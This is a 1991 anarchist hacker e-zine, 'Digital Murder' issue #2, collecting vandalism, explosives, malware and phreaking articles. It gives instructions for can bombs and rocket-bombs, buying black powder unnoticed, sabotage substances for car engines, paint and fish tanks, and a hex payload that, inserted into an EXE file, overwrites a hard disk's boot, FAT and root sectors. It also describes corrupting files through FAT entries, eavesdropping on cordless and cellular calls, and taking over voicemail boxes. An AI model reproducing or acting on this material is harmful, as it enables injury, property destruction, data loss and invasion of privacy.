         Here it is!  Issue #2 of Digital Murder released, slightly
         late,  November 25th, 1991.  It'z been hell getting everyone
         motivated enough to continue a monthly 'zine but, as you can
         see, it was done.

         We got a lot of positive responses from readers and have heard
         that issue #1 hit 35 or so boards in the United Socialist Republic
         of America and a few boards overseas (Sweden, Switzerland, and
         Holland).  Thanks goes out to those few that I asked to spread
         the magazine and an even larger group that spread it without me
         asking. . . you know who you are.  

         Since the idea of using a P.O. Box flopped due to no one sending
         us mail to it, we have closed it.  If you were thinking about
         sending us a letter, sorry.  We have plans on getting an internet
         address as soon as I decide where to get it.  As well as the 
         internet address, we plan to start a usenet newsgroup.  We will
         put a complete list of addresses to reach us at in issue #3 which
         will be out December 15th.  So until issue #3 comes out, call
         The Backdoor at 901.386.6455 to leave comments, submit articles,
         pick up the current or previous issue, etc.

    Sticky Coolwhip
    ---------------
    
    This first project involves three substances; Vinegar, Milk
    (whole), and Cool Whip.

    Heat the milk in a pot until it comes to a VERY  low  boil.
    Add vinegar until it  separates.  The  solids  are  CASEIN.
    Heard of it before??  heheh.. yeah, that's  the  shit  they
    used to use for superglue.  Now, all you have to do is make
    a good amount of this and  mix it  with  Cool Whip.  You'll
    have a fluffy white mixture which puffs up very nicely  and
    is sticky as hell.

    Possible uses:
                   Cake topping.  Fucks up dentures
                   (and regular teeth)
 
                   Cover for keyhole on car.. (guess)

                   Car design solvent.  Munches the paint
                   right off.

    Try freezing it.  If you've whipped it up enough, it should
    be fairly liquified and will run easily.  Freezing it  will
    give you a substance similar to a Jell-O pudding shit.  Try
    adding food coloring and putting it on a stick.. will taste
    like milk that's slightly older than God.



    Phun With Coke Cans
    -------------------

    Hell, you could use any kind of can for these as long as ya
    drain it, wash it, and let it dry WELL.  

    For this first project, you'll need to cut the  bottom  off
    of one of the cans.  Really old  scissors  that  are  still
    fairly sharp (and which won't be missed by, say, the  local
    store) are good for cutting cans since  they  cut  straight
    and quickly.  Cut the bottom off with about 1 inch of  thin
    metal left to make a cup-looking thing.  Take the  scissors
    and at about 1 quarter inch margins (one centimeter for the
    Euros, I know it's not equivalent, but it doesn't  matter),
    cut down the sides about  another  quarter inch.  Bend  the
    flaps down to keep from getting cut  while  you  work  with
    this thing.  If you have soldering experience,  solder  the
    flaps to the inside of the can just to make sure (this also
    makes it easier to use in other projects).








                                                                          4


    You can make a lot of these now if you  want  because  they
    will be the most-used part of the cans.  Don't  throw  away
    the top part yet because the sheetmetal-type  aluminum  can
    be used to make some AWESOME 'noisemakers'!! 

    Now that you have a few of these prepared, obtain some black
    gunpowder.  This is sold at some weapons  shops  (especially
    those which specialize in Black-Powder  or  antique-interest
    weapons, or which carry  shell  packing  materials  for  the
    rabid hunter who likes to repack shells). You should be able
    to get this without any permits but if you buy it in excess,
    questions will be asked.  To  be  safe, either  buy  packing
    materials (which can also be useful if you're  the  creative
    type) or buy from different stores around the area, rotating
    your supplier every week.

    We can now begin on our first 'device'.  In  model  rocketry
    hobby section of your local hobby store there are  specially
    made engines and ignitors for these  engines.  They  can  be
    used for our purposes seperately or together, so get  a  few
    of them.  The ignitors are electricity-based flamers and You
    will need some source of electricity (about 2-3 AA batteries
    should do the trick) and some  LONG  wires  to  connect  the
    flamer to the source.  Some Scotch tape (or any clear, light
    weight tape) is needed to hold  the  flamers  in  place.  In
    this project, you need to cut out some  of  the  scrap-metal
    from the long  upper  part  of  the  cans.  One  can  should
    provide at least enough for two of these devices.  Cut  just
    enough of the sheet metal out to totally encircle a  medium-
    powered rocket  engine  (I  like  the  A8-3  single  stagers
    myself).  The engine should be large  enough  to  carry  the
    weight of the metal.  When you have the  metal  cut  to  the
    proper size, move the engine FAR away and solder  the  metal
    into a cone.  Cut a small circle of metal just big enough to
    cover one end of the cylinder and solder it  in  place.  Let
    this cool OVERNIGHT just to be safe.  The engine should  now
    slide into and out of the  container  easily.  Depending  on
    what type of thing you want to  make, follow  the  remaining
    instructions:

    1: Bomb-- To make a bomb out of this, cut another  circle  out
              of the metal as though you were going  to  plug  the
              second end up as well.  Cut one side of this  circle
              just enough so that the igniter and wires can  still
              fit correctly to the engine.  Plug the  empty  space
              with something which is light but flammable, such as
              toilet paper or paper towels but not too  tight.  If
              you're too nervous to solder the  second  cover  on,
              use something like superglue or epoxy.

    2: Rocket/bomb--  The same as above, except that you can  pack
              some explosive substance at the closed  end  of  the
              container, then some toilet tissue or  Kleenex  (not
              very much on this one though), then the engine.  The
              engine must be superglued in just at the  bottom  of
              the tube where the rocket end is exposed so lift can
              be achieved. 






                                                                          5


              It is  advised  that  you  put  controlling
              surfaces on your rocket so it will be a little  more
              predictable.  Use light tape on  the  flamer  so  it
              will easily release when the  rocket  lifts  off.  I
              strongly recomend using some sort of launch guidance
              system, such as a part of a drinking straw glued  to
              the outside of the rocket and then set onto a  metal
              dowell that will keep it flying straight until  it's
              at a safe height.

              When the rocket reaches its top flight, it will send
              out a small explosion  at  the top which will ignite
              whatever you pack up there.

              The rocket works best with  custom-designed  rockets
              from your hobby store, with some slight modifications,
              such as an addition of the  explosive instead of a
              parachute or streamer. 
         
              The rockets may take a few  seconds/minutes
              to ignite, since some  flamers  aren't  as  good  as
              others.  If you make a heavy rocket, use as  big  an
              engine as it needs (you'll learn by experiment).

    Cans can also be used to make great alcohol lamps, ovens, or
    bombs.  Get a flamer from the previous projects, some  dena-
    tured alcohol (6xx proof!!! don't drink it!!) and  some  can
    bottoms.  Drill a hole in one can bottom big enough to  work
    with, but not so big as to be unpluggable.  Solder this  one
    to an unmodified can bottom to make  a  container  with  two
    bottoms.  The hole should be in the center of the bottom  of
    one of the  cans.  Pour  the  alchohol  into  the  container
    slowly through the drilled hole until it is about 3/4  full.
    Put a flamer in the hole so that it just barely touches  the
    alcohol.  Tape this sucker  up  good  and  superglue  it  if
    possible.  The flamer should ignite the  alcohol  which  has
    just enough air to burn  good,  and  the  cans  will  either
    implode or explode depending on whether the  alcohol  cathes 
    fire good or not.  It may just use up some of the oxygen and
    create a partial  vaccum,  or  it  may  explode  and  spread
    burning alcohol quite a distance.

    A full can of a carbonated drink can be fun, too.  Shake  it
    up, roll it around, throw it up in the air (if you throw  it	
    really high, catch it.  If not, let it hit the ground).  Try
    putting it over a LOW flame on a grill.  When it  starts  to
    bulge, remove it.  After doing any/all of these things, take
    it to a tall building with a stairway.  If it is  like  most
    stairways, there will be some space in the center where this
    can be dropped.  With the combination of the pressure inside
    the can and the force of it  falling,  the  impact  will  be 
    quite messy (and if not found for a few days, sticky, smelly
    and hazardous to the new paint job too...   heheh..)  It  is
    hell to clean up.. just try to get the can to add that extra
    touch to the question "What the Hell happened here?"    They
    won't even know where to begin asking questions...







                                                                          6


    All of these ideas can be expanded upon, modified,  or  just
    plain used in unusual ways.  Remember,  always  be  creative
    with your methods of destruction...  NG '91 -- InFOWOrd/ DK.


    Awful Magic Powder - by: Mystic Blade!
    ------------------
    
    Needed
    ------
            * 6 or 7 cans of Arid Extra Dry spray.
            * 1 closet size mirror
              * Note * You can scale this done to just a bathroom
              mirror or any flat smooth surface. 

    Spray the surface of the mirror until completey solid white.

    Let it set and dry for the next 24 hrs. then scrape of the
    residue.  Do this until all the Arid is gone.  You now have what's
    known as Great awful magic powder.


    One ounce of this powder per automobile gas tank will screw up an
    engine.

    A single teaspoon will kill off a 10 gallon fish tank and all the fish.

         Hey,  you  anarchists  trying  to learn something, This is for
    you!  I just thought you might find it interesting...

    Do you know that you can destroy a hard disk by writing 18 bytes
    to the end of an EXE file (you can do it with 14 but I'll just do
    this for the sake of simplicity).

    Ok, to use this look for the last occurence of CD 21 (or m! in ascii)
    with some type of hex/ascii editing program.  Once you have found it,
    insert these hex codes after that last CD 21.  Be careful...  Don't
    run this program after you have "fixed" it unless you want to re-
    format your HD.  Here goes...











                                                                          7


    (insert these bytes of hex code in after the final m! [CD 21].
    Notice that the m is ascii 205 not an equal sign (=).)

    B4 03
    B0 C8
    B5 00
    B1 01
    B6 00
    B2 02    (the 02 stands for the C drive.  You can specify 00 for
              A drive, or 01 for B drive, etc...   This is the drive
              that you want to destroy.)
    CD 13
    B4 4C
    CD 21
  
    Well, that's pretty much it.  Viruses are made in a way such as
    that the virus takes code such as this and manually inserts  it
    into an EXE or COM file along with the code  that  it  has  for
    self replication.  Also, notice that this code is made to write
    over the boot, FAT, and root directory sectors  with  just  any
    ole' address out of memory...  ( whatever is in the DS  and  DX
    registers at the time ).  Note that you can  also  insert  your 
    code BEFORE the last CD 21 by inserting it two bytes before the
    last CD 21 (those two bytes in fact should be B4 4C).  Once you
    do that, you can cut this code down to 14 bytes by  eliminating
    the final four bytes (B4 4C CD 21).

    File Phun
    -=-=-=-=-

    Scanning files in directories, and changing the entry of the
    "starting cluster" and the file size.  By  changing, I  mean
    swapping with other files so, therefore, if you once had  an
    EXE file called READTHG.EXE and some other files, you  would
    mysteriously find that READTHG.EXE contained another EXE,  a
    data file, or a text file.

    How do you do it?  No problemo...  First you ascertain  info
    from the boot sector on where the  FAT  and  root  directory
    sector are located which will be explained later.  Then  you
    pick out the root directory sector.  Filename entries  in  a
    directory sector are stored as such:

      [ Filename- 11 bytes no period!] [Attribute- 1 byte]
        XX XX XX XX XX XX XX XX XX XX XX XX

        [Reserved by MS-DOS- 10 bytes] [Time/Date stamp- 4 bytes]
        XX XX XX XX XX XX XX XX XX XX  [Time]  [Date]
                                       XX XX   XX XX

        [Starting Cluster- 2 bytes]  [File Size- 4 bytes]
        XX XX                        XX XX XX XX

        Notice that the XX's are hexadecimal numbers.









                                                                          8


        1.  Filename is padded with spaces between the first eight and
            the last 2. ie HELLO  DOC... It MUST be padded with spaces
            if it is to be used.

        2.  Attribute: 
                      Read Only-    hex 01
                         Hidden-    hex 02
                        Archive-    hex 20
                   Subdirectory-    hex 10
                   Volume Label-    hex 08
                         System-    hex 04

        When these attributes are combined (say read only and hidden),
        they produce hex 03, or the sum of their numbers.

        3. Time/Date stamp will almost ALWAYS be irrelevant to a good
           anarchist.

        4. Starting Cluster- this is the cluster where the file  starts.
           DOS reads the FAT chain and determines where ALL of that file
           is but if this and file size are swapped  with  other  files,

         This technical journal on Telephone Networks has been
    compiled to introduce the basics of them to  newer  phreakers
    yet does contain a lot of information that will interest  the
    more advanced reader.


    History of Virtual Networks
    =-=-=-=-=-=-=-=-=-=-=-=-=-=

    To be honest, virtual networks are nothing new since many LDS
    companies, such as AT&T, MCI, and Sprint, have been  offering
    them since 1985.

    ISACOMM (now US Sprint) was the first to introduce a  virtual
    network  service,  using  Satellite  Business  Systems  (SBS)
    satellites as early as '84.  SBS acted as the  carrier  while
    ISACOMM  was  responsible  for  promoting  and  managing  the
    service.







                                                                          9


    SBS introduced it's own network in early '85  and  was  later
    bought by MCI.

    Also in 1985, US Telecom redifined ISACOMM  as  VPN  (Virtual
    Private Network) which is now the base for Sprint.  Later on,
    AT&T introduced its Software Defined Network (SDN) product.
    

    AT&T's  SDN
    =-=-=-=-=-=

    When a user picks up his phone at an  on-net,  dedicated  SDN
    site and dials a number, the dialed digits are  sent  to  the
    serving AT&T SDN office through the local network.  This  SDN
    office receives the dialed digits, and notes the  originating
    number via ANI (Automatic Number Identification).  This  info
    is passed to the ACP (Action Control Point), which will  then
    check the NCP network database for  routing  and  translation
    information based on the ANI of the user.  After the check is
    complete, the NCP returns appropriate routing information  to
    the ACP, which encodes a billing record  and  send  the  call
    through the network.

    AT&T  has  marketed  many  special  features  with  SDN.  For
    example, when the NCP receives the call information from  the
    originater of the call, it can screen the call  according  to
    a set of valid originating numbers to see if the call is even
    allowed to be sent through the network.  It can also be setup
    to request an authorization code to validate  calling  privs.
    It can prompt certain screened calls with preprogrammed  ann-
    ouncements to provide options for routing.

    Off-net calls follow a similar procedure in which the user of
    the SDN dials an off-net access number (800- or 950-) or  can
    access the network through switched  equal  access.  In  this
    case, the dialed digits and any code entered are screened and
    sent to the ACP, and then gets instructions from the NCP.

    Whenever announcements are required, they are sent  from  the
    Network Services Complex (NSC).  Thus, if the network were to
    ask for an authorization code, the message would be sent from
    the NSC.

    MCI's  VNET
    =-=-=-=-=-=

    This network uses three types of switches:  1) Northern Tele-
    com DMS-250, 2) DEX 400, and 3) DEX 600 by Digital Switch Co.
    MCI uses SS7 (signal system 7) on all of  their  intermachine
    trunks.

    When a user picks up the phone and calls the  dialup,  it  is
    connected into the MCI Vnet network similarly to SDN by AT&T.
    The routing of a Vnet call  starts  with  a  request  from  a
    digital switch to the Network Control System (NCS) for  route
    information.  This request travels through one  of  the  Data
    Access Points and then the NCS checks the customer's database
    for routing information, call privileges, etc. and sends that
    information back to the switch, again through the DAP.  After
    all this, the call is sent through.

    US Sprint's VPN
    =-=-=-=-=-=-=-=

    US Sprint uses 100% fiber optic networking and uses powerful
    Northern Telecom DMS-250 switches linked by SS7, with DMS300
    switches as international gateways.

    When a US Sprint VPN user picks up the phone, dials a  local
    VPN system, and calls through it, the call is  forwarded  to
    a serving point.  That switch, through its Message  Switch &
    Buffer (MSB) signaling point, sends a routing request to the
    nearest Signal Transfer Point (STP).  The STP passes the re-
    quest to the Database Control Point  (DCP)  for  processing.
    After checking the customer's database account, the info  is
    sent back to the MSB.  The call is then sent through.

                      Scanning for Phun and Information.

    Scanners are wonderful toys.  They allow us to listen to info
    that otherwise would be impossible to hear.  Everyone has heard
    of using scanners to listen in on police and fire, but that gets
    old after a while.  One can only hear so much of police calling
    in stating that they are going on a doughnut break.  Now there is
    a use for a scanner that is much more interesting, not to mention
    fun: listening in on cordless phones and cellular phones.
    One day, blackened buffered a post off of a board that listed the
    10 cellular frequencies.  There are 10 for the base and 10 for
    the handset.  The base frequencies are the most powerful, there-
    fore these are the ones that should be put into the scanner.  I
    did not except much while i reluctantly inputed the frequencies
    but after I fired up and started scanning, I could not believe
    my ears.  







                                                                         13


    Picking up my neighbors is really quite interesting.  I have
    heard everything from a woman's daughter being pregnant to a
    couple owing 10,000 dollars in back taxes, and their unhappiness.
    It is so easy to pick up these cordless phones that it is funny.
    
    Cordless phones can be picked up by any programmable scanner such
    as the $139.00 Radio-Shack pro-38, 10 channel programmable.
    Below is a list of the cordless phone frequencies:

           Channel                  Base                      Handset
              1                    46.610                     49.670
              2                    46.630                     49.845 
              3                    46.670                     49.860 
              4                    46.710                     49.770
              5                    46.730                     49.875  
              6                    46.770                     49.830 
              7                    46.830                     49.890
              8                    46.870                     49.930 
              9                    46.930                     49.990
             10                    46.970                     46.970 

    Now onto the more interesting and lively world of cellular
    phones.  You must have a scanner that is 800 megahertz capable.
    My personal choice is a realistic pro-34.  This is a hand-held
    model that has 200 channels, built in backlit lcd, and 10 
    channel temporary storage, for an effective capacity of 210
    channels.  This scanner runs for about $300 bux but I bought
    mine at a pawn	shop for $120.  The true cellular band is from
    869.0000 mhz to 894.000 mhz.  For some reason the powers that
    be convinetly omit the cellular band, instead, stopping at
    868.9375 and resuming at 896.1125 on the pro-34.  If you are
    happy listening to "mobile" phones, more appropriately known
    as two way radios, that operate in the 800 mhz band then a
    "stock" scanner is fine but if you are like me, that's just
    not enough.

    I was looking through a copy of radio-electronics one day and
    noticed that there was a scanner BBS.  I called this bbs and
    downloaded a text file that contained the steps to modify a
    pro-34 for true cellular capabilities.  There is not room here
    to go into how to modify the scanner but call the Red Onion BBS
    at (914) 342-4585 to get the file for this scanner or any other
    scanner (they have files for all popular scanners).  After making
    the modifications, you can start the search scan at 869.0000
    to 894.0000. 

    If you live a large city, the cellular band is active at all times.
    I have listened to calls with subjects such as drug deals,
    prostitution, people growing their own dope, and a lady talking
    about using dildos.  One particully funny moment was when this one
    guy got into a fight with his girlfriend, went out and got drunk,
    and on his way home he called up his girlfriend crying and moaning
    and then he got pulled over for drunk driving.  It is also a

 
 
 
 
 
 
 
 
 
                                                                         14 
 
 
    good way to get information if you have a DTMF decoder.  A lot of
    people that have cellular phones also have VMB's.  You can listen
    in as they call their system and if you are familiar with the
    system that they are on, you can call up and take over their box.

    If you think that this would be an interesting thing to do then
    be sure to do it soon because in the next ten years or so all
    cellular services will be switched from analog to digital making
    it impossible for a conventional scanner to be able to decode the
    conversations.  If you have any questions, or information that
    you have found useful then please leave me mail on Digital murder's
    WHQ, The Backdoor BBS at (901)/386-6455.

          This  series  of  artices  to  follow  has  taken  much time
          and extensive coverage.   I  see  these  articles  as  truly
          original material, as I went through personal connections to
          get the information contained here.
          
         The following information was taken  from  various  technical
         sources and other misc. information from a rural area here in
         my state. I live in Memphis, which  is  under  ESS,  however,
         where I was at, they were under some other older system.

         The  Action  Roadrunner  Telephone  Management  System  is  a
         computer controlled routing,  tandem  switching  system.   As
         such, the system functions in support of an existing PBX type
         system and may be configured for network  operations  between
         properly equipped locations.  Through these  of  the  network
         capabilities,  a  business can impliment a private network to
         reduce overall call costs and record  network/system  traffic
         statistics.  Network operations are provided by extending the
         local serial bus of the Master node to control the  operation
         of  satellite  nodes and collect call record data from Remote
         intelligent nodes.  Unintelligent (noncomputerized) satellite
         nodes  are  controlled exclusively by the intelligent node to
         which they are connected by data link  and  tie  lines.   The
         Intelligent  Remote  nodes  direct  their own call processing
         functions and those of their associated Satellite nodes.   In
         this  configuration,  the Master node serves as a centralized
         record  collection   point   while  providing  a  centralized
         database update point.

         The  support  equipment  expalined  serves  to   expand   the
         interfacing  capabilities  of  the  system  by  accommodating
         ground  start-type  trunk  circuits  and  collected  key-type
         systems.  Other equipment, when optionally  selected  by  the
         CO,  is  designed  to provide remote access from rotary tele-
         phone by the Voice Terminal Device.

         VCA Subsystem
         -------------
         
         A Pulsecom Voice Connecting Arrangement  (VCA)  subsystem  is
         used  instead  of Telco-supplied CDH-type VCAs.  Each circuit
         card interfaces one system port to one  Telco  trunk  circuit
         (DDD,  WATS, or FX).  These cards are housed in 10 card cages
         which  are  assembled  into  a  wall  mounted  rack  assembly
         containing  eight  card  cages  for  a  total of 72 VCAs on a
         freestanding rack assembly containing 16  card  cages  for  a
         total of 144 VCAs.

         Amplifier Subsystem
         -------------------
         
         Trunk  amplification  is  used  to adjust and stabilize trunk
         levels appearing at the  system  while  being  OFF  when  the
         circuit  is  not  in  use.   The single-channel circuit cards
         (repeaters) housed in 11-slot card cages are assembled into a
         wall  mounted  rack assembly which can contain up to six card
         cages for a total of  66  amplifiers  per  rack.   Each  rack
         requires  a  dedicated  120  Vac  15 amp circuit to power the
         -48 Vdc power supply which supplies the required power to the
         card cages.  Two amplifier circuit card types  are  available
         for  voice only or voice/data circuits.  A voice-only circuit
         uses the UM-100 Amplifier Card and a voice/data circuit  uses
         a  VFR-1050  Amplifier  card.  Both card types share the same
         card cage.  One 25-pair cable is used per  card  cage.   Each
         circuit  consists  of two-cable pairs for a total of 22 pairs
         within each cable.  The first cable pair is connected to each
         of  the  Telco  side of the demark and the second pair to the
         ACTION side.
         
         The UM-100 Amplifier Card is equipped with a UM-3502  Plug-on
         Option  card  which  is  used to program the amplifiers oper-
         ation.  Two adjustment options are also  available  with  the
         3502  card.   The  VFR-1050  Amplifier  card is supplied with
         progammable options as well.  This card  is  used  when  data
         transmissions are anticipated on the connected trunk circuit.

         The  VFR-1050   Amplifier   Card  options  given  consist  of
         amplifier   gain    adjustment,    equilization   adjustment,
         sensitivity slope adjustment, and a  disable  on/off  switch.
         
         Keyset Adapter Subsystem
         ------------------------

          The Keyset Adapter subsystem is employed to permit telephone
          circuits that are not associated with a PBX type  system  to
          be  interfaced  to  the  system.  Key systems  or  dedicated
          single-line  instruments  may  access  the  system  by  this
          subsystem.  The Keyset Adapter Subsystem may  be  configured
          in  a  free  standing  rack (128 circuits max.) or on a wall
          mounted unit (48 circuits max.)  The two circuit cards  that

          make  up  the  Keyset  Adapter  Circuit  are the E&M-to-Loop
          Converter Card and the Dual Line Coil Card.  The  Dual  Line
          Coil Card accommodates two E&M-to-Loop cards.  The cards are
          clustered in groups of three with the Dual Line Coil Card in
          the center to provide two circuits.  Three clusters of three
          cards each supply six circuits per card  cage  in  the  wall
          mount  unit  and  four  clusters yielding eight circuits per
          card cage in the free standing rack.

         Voice Terminal Device
         ---------------------
         
         The Voice Terminal Device (VTD) is a  word  recognition  sub-
         system configured into a single cabinet.  The VTD is composed
         of a cental processor, a vector processor, memories, and  I/O
         devices  for  eight  system ports.  The System port cards are
         configured for 2-wire operation with 0db pads  and  serve  as
         the bidirectional VTD interface.

         The  System  port  cards  used  for  the  VTD  are located in
         consecutive card cage slots within a single card  cage.   The
         first  card is a Voice Terminal Serial Interface Card and the
         next seven  cards  are  Audio  Interface  Cards.   The  Voice
         Terminal  Serial  Interface card accepts the binary output of
         the VTD for the  eight  serial  ports.  Theu|Y| decoded output of
         each of the right ports is sent to the Voice Terminal  Serial
         Interface card in the first port.

         Hope  that  was  at least a little bit interesting.  That was
         nowhere near the complexity of explainng ESS.   However,  the
         little  trip to the past could prove useful because many sys-
         tems such as these are still in  use.   I  will  have  future
         articles on the Action  system  but  for  now  I  can't  type
         anymore...  Hehehe..

         Later  all and don't forget; Bell holds the ultimate in info-
         rmation and power from us but they will not be able  to  hold
         back  the flood of hackers breaking away at their wall.  Long
         live the cause.

    Maybe some of these will keep your brain clear but not washed
    like most in this country.  You know the ones. . . those that
    are insecure about their future.  Those are the people we all
    remember back in High School;  the guys and  girls  who  were
    alwayz pushing themselves into  the  system-  alwayz  pushing
    themselves into the clubs and cliques- pushing  their  future
    through a sieve, draining out all their unique qualities till
    all that's left is another person totally conditioned to be a
    corporate slave.  Think about this.  Think about and question
    everything.

    Thanks for reading and supporting Digital Murder.   Issue  #3
    will be out December 15th.  FEEL FREE to help out!  Don't let
    those fascist shits on Capital Hill fool  you  into  thinking
    that you can't still voice your opinion or share information!
    Call The Backdoor, leave me, Morpheus, feedback.  Send in  an
    article or just drop in and say what's on your mind.

    The 'zine should be better now that it'z getting more support
    as well as the fact that I've moved to the most  boring  city
    in the whole phucking world.  The most ''exciting'' thing  to
    do around here is this building that is the home of  a  movie
    theater that shows old movies, a  skating  rink  and  bowling
    alley for pre-teen preppies, and an arcade featuring billybob
    and his cousins playing pool for car titles while I waste  my
    money on one of the seven video  games  in  the  city's  only
    arcade.  At least the old city I lived in isn't too far  away
    from here.  So while you  are  walking  around  breathing  in
    America's cold, toxic, city air or feasting on the carcass of
    a dead turkey for thanksgiving, think of your editor  slaving
    over the keys to bring forth another edition of the  one  and
    only Digital Murder.
